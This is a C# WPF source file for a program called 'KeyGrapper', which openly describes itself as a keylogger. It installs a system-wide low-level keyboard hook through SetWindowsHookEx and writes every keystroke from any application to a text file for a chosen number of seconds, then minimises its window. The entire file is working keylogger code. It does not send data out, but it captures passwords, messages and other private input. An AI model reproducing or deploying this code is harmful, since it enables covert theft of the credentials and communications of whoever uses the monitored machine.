using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Input;
using System.Windows.Forms;
using System.Threading.Tasks;
using MessageBox = System.Windows.MessageBox;
using MouseEventArgs = System.Windows.Input.MouseEventArgs;

namespace KeyGrapper
{
    public partial class MainWindow
    {
        private const int WhKeyboardLl = 13;
        private const int WmKeydown = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookId = IntPtr.Zero;

        public MainWindow()
        {
            InitializeComponent();

            TitleLabel.MouseLeftButtonDown += TitleLabel_MouseLeftButtonDown;
            TitleLabel.MouseMove += TitleLabel_MouseMove;
            TitleLabel.MouseLeftButtonUp += TitleLabel_MouseLeftButtonUp;
        }

        private static string _logFilePath;

        private bool _isDragging;
        private double _offsetX, _offsetY;

        private void TitleLabel_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            _isDragging = true;

            _offsetX = e.GetPosition(this).X;
            _offsetY = e.GetPosition(this).Y;
        }

        private void TitleLabel_MouseMove(object sender, MouseEventArgs e)
        {
            if (_isDragging)
            {
                double newX = e.GetPosition(this).X - _offsetX + Left;
                double newY = e.GetPosition(this).Y - _offsetY + Top;

                Left = newX;
                Top = newY;
            }
        }

        private void TitleLabel_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            _isDragging = false;
        }

        private void Button_Close(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void BrowseButton_Click(object sender, RoutedEventArgs e)
        {
            using (var dialog = new FolderBrowserDialog())
            {
                DialogResult result = dialog.ShowDialog();

                if (result == System.Windows.Forms.DialogResult.OK && !string.IsNullOrWhiteSpace(dialog.SelectedPath))
                {
                    FilesLocation.Content = dialog.SelectedPath;
                    _logFilePath = dialog.SelectedPath;
                }
            }
        }

        private void StartButton_OnClick(object sender, RoutedEventArgs e)
        {
            if (String.Equals(FilesLocation.Content, "Click here"))
            {
                MessageBox.Show("Please select a location to save the files", "KeyGrapper");
            }
            else
            {
                if (FileName.Text.Contains(@"\") || FileName.Text.Contains(@"/") || FileName.Text.Contains(@":") ||
                    FileName.Text.Contains(@"*") || FileName.Text.Contains(@"?") || FileName.Text.Contains("\"") ||
                    FileName.Text.Contains(@"<") || FileName.Text.Contains(@">") || FileName.Text.Contains(@"|"))
                {
                    MessageBox.Show("Please enter a valid file name", "KeyGrapper");
                }
                else
                {
                    if (TimeBox.Text != "")
                    {
                        int time;

                        bool success = Int32.TryParse(TimeBox.Text, out time);

                        if (!success)
                        {
                            MessageBox.Show("Please enter a valid time", "KeyGrapper");
                        }
                        else
                        {
                            //start all the stuff
                            _logFilePath = Path.Combine(FilesLocation.Content.ToString(), $"{FileName.Text}.txt");
                            _hookId = SetHook(_proc);
                            MessageBox.Show("Keylogger started", "KeyGrapper");
                            WindowState = WindowState.Minimized;
                            EndLogging(time);
                        }
                    }
                    else
                    {
                        MessageBox.Show("Please enter a valid time", "KeyGrapper");
                    }
                }
            }
        }

        static async Task EndLogging(int time)
        {
            await Task.Delay(TimeSpan.FromSeconds(time));
            MessageBox.Show("End of program", "Program");
            Environment.Exit(0);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WhKeyboardLl, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WmKeydown)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                string keyName = GetKeyName(key);

                using (StreamWriter sw = new StreamWriter(_logFilePath, true))
                {
                    sw.Write(keyName + " ");
                }
            }

            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static string GetKeyName(Keys key)
        {
            switch (key)
            {
                case Keys.Back:
                    return "Backspace";
                case Keys.Space:
                    return "Space";
                case Keys.Enter:
                    return "Enter";
                case Keys.Tab:
                    return "Tab";
                case Keys.Shift:
                    return "Shift";
                case Keys.Control:
                    return "Ctrl";
                case Keys.Alt:
                    return "Alt";
                case Keys.Right:
                    return "R_arrow";
                case Keys.Left:
                    return "L_arrow";
                case Keys.Up:
                    return "Up_arrow";
                case Keys.Down:
                    return "Dn_arrow";
                default:
                    return key.ToString();
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}